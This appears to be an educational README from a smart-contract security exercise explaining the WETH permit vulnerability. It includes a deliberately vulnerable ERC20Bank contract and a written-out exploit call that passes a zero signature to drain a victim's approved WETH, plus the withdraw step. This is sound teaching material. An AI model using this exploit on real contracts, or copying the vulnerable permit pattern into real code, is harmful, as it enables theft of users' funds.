# 🔐 WETH Permit Vulnerability

**Reference:** https://solidity-by-example.org/hacks/weth-permit/

---

## 📌 Understanding EIP-2612: Permit

**Permit** lets you approve token spending with a **signature** instead of an on-chain transaction.

---

### 💡 The Problem Permit Was Designed to Solve

**Traditional ERC-20 Approval Flow (2 transactions):**

```
1. User calls approve(spender, amount)     → costs gas ⛽
2. Spender calls transferFrom(...)         → costs gas ⛽
```

**Problems:**
- Users must pay gas twice
- Bad UX, especially for new users
- Requires holding ETH for gas

**Permit (EIP-2612) removes step 1!** ✅

---

## 🔧 How Permit Works (Conceptually)

### Step 1: User Signs a Message Off-Chain

The message says something like:

```
"I allow ERC20Bank to spend 100 USDC until timestamp T"
```

**Key:** No gas cost, no transaction, just a cryptographic signature! 🆓

---

### Step 2: Anyone Submits That Signature On-Chain

Usually the app or contract does this.

The transaction includes the signature parameters `(v, r, s)`.

---

### Step 3: Token Contract Verifies the Signature

The token contract checks:
- ✅ `signer == token owner`
- ✅ `nonce` is valid (replay protection)
- ✅ `deadline` hasn't passed

---

### Step 4: Allowance is Updated

Just like `approve()` — but **without the owner paying gas**!

The spender can now call `transferFrom()`.

---

## 📝 The Permit Function Signature

```solidity
function permit(
    address owner,      // Token holder
    address spender,    // Who is allowed to spend
    uint256 value,      // Amount to approve
    uint256 deadline,   // Expiration timestamp
    uint8 v,           // Signature component
    bytes32 r,         // Signature component
    bytes32 s          // Signature component
) external;
```

**Important:**
- `owner` = token holder who signed the message
- `spender` = who is allowed to spend tokens
- `(v, r, s)` = ECDSA signature from owner

---

## ⚠️ What Permit Does NOT Do

❌ **It does NOT move tokens**  
❌ **It does NOT deposit tokens**  
❌ **It does NOT authenticate `msg.sender`**

**Permit ONLY sets allowance.**

Just like calling `approve()` manually, but with a signature instead of a transaction.

---

## 🚨 The Critical Problem: Not All Tokens Implement Permit!

**EIP-2612 (Permit) is OPTIONAL!**

Many tokens, including **WETH (Wrapped Ether)**, do **NOT** implement the `permit()` function.

### What Happens When You Call `permit()` on WETH?

Let's look at the WETH contract:

```solidity
contract WETH is ERC20 {
    // WETH does NOT have a permit() function!
    
    fallback() external payable {
        deposit();  // Fallback calls deposit()
    }
    
    function deposit() public payable {
        _mint(msg.sender, msg.value);
    }
}
```

**When `permit()` is called on WETH:**
1. WETH doesn't have a `permit()` function
2. The call triggers the `fallback()` function
3. The `fallback()` calls `deposit()`
4. If no ETH is sent, it mints 0 WETH
5. **The call doesn't revert** ❌

This is the core of the vulnerability!

---

## 🎯 The Vulnerability Explained

### The Vulnerable Contract

```solidity
contract ERC20Bank {
    IERC20Permit public immutable token;  // Assumes token has permit()
    mapping(address => uint256) public balanceOf;
    
    function depositWithPermit(
        address owner,
        address recipient,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        // ❌ BUG 1: Assumes token implements permit()
        // On WETH, this calls fallback → deposit() → doesn't revert!
        token.permit(owner, address(this), amount, deadline, v, r, s);
        
        // ❌ BUG 2: Uses existing approval if permit doesn't work
        token.transferFrom(owner, address(this), amount);
        
        // ❌ BUG 3: Credits tokens to recipient (not owner!)
        balanceOf[recipient] += amount;
    }
}
```

---

## 💥 The Attack

### Setup

**Alice** (victim):
- Has 1000 WETH
- Previously approved `ERC20Bank` to spend her WETH
- Has deposited 1 WETH normally

**Attacker**:
- Wants to steal Alice's WETH

---

### Attack Flow

#### Step 1: Attacker Calls `depositWithPermit()` With Fake Signature

```solidity
bank.depositWithPermit(
    alice,      // owner (victim's address)
    attacker,   // recipient (attacker's address)
    1000e18,    // amount (all of Alice's approved WETH)
    0,          // deadline (doesn't matter, will be ignored)
    0,          // v (fake)
    bytes32(0), // r (fake)
    bytes32(0)  // s (fake)
);
```

---

#### Step 2: What Happens Inside the Contract

```solidity
// 1. Call permit() on WETH
token.permit(alice, address(this), 1000e18, 0, 0, 0, 0);
```

**In WETH:**
```solidity
// permit() doesn't exist
// → fallback() is triggered
// → deposit() is called
// → mints 0 WETH (no ETH sent)
// → DOESN'T REVERT! ✓
```

**Back in ERC20Bank:**
```solidity
// 2. Transfer tokens using Alice's EXISTING approval
token.transferFrom(alice, address(this), 1000e18);
// ✅ This works because Alice approved the bank earlier!

// 3. Credit tokens to recipient (attacker!)
balanceOf[attacker] += 1000e18;
// ❌ Alice's tokens are credited to the attacker!
```

---

#### Step 3: Attacker Withdraws

```solidity
bank.withdraw(1000e18);  // Attacker withdraws Alice's WETH!
```

---

### 💸 Result

```
Alice's WETH balance: 1000 → 0 (stolen!)
Attacker's WETH balance: 0 → 1000 (stolen from Alice!)
Alice's bank balance: 1 WETH (only her original deposit remains)
```

**The attacker stole Alice's WETH without a valid signature!**

---

## 🔍 Why This Works

### 1. WETH Doesn't Implement Permit

```solidity
// WETH doesn't have permit()
contract WETH {
    // ❌ No permit() function
    
    fallback() external payable {
        deposit();
    }
}
```

When `permit()` is called, it triggers the fallback instead of reverting.

---

### 2. The Fallback Doesn't Revert

```solidity
fallback() external payable {
    deposit();  // Just mints 0 WETH if no ETH sent
}
```

This allows the vulnerable contract to continue execution.

---

### 3. Existing Approval is Used

Alice had already approved the bank, so `transferFrom()` works even though the permit call didn't actually set any new approval.

---

### 4. Wrong Recipient Gets Credited

The function takes separate `owner` and `recipient` parameters:
- Tokens are taken from `owner` (Alice)
- Credit is given to `recipient` (attacker)

---


## 🧪 Testing the Exploit

The test is in `test/ERC20BankExploitTest.t.sol`.

### Running the Test

```bash
forge test --mc ERC20BankExploitTest -vvv
```

### The Exploit Call

```solidity
// Attacker calls depositWithPermit with fake signature
bank.depositWithPermit(
    user,       // Alice (victim who has approved the bank)
    attacker,   // Attacker (gets the credit)
    bal,        // Amount to steal
    0,          // Invalid deadline (doesn't matter)
    0,          // Invalid v (doesn't matter)
    bytes32(0), // Empty r (doesn't matter)
    bytes32(0)  // Empty s (doesn't matter)
);
```

**The permit call triggers WETH's fallback, doesn't revert, and execution continues!**

---

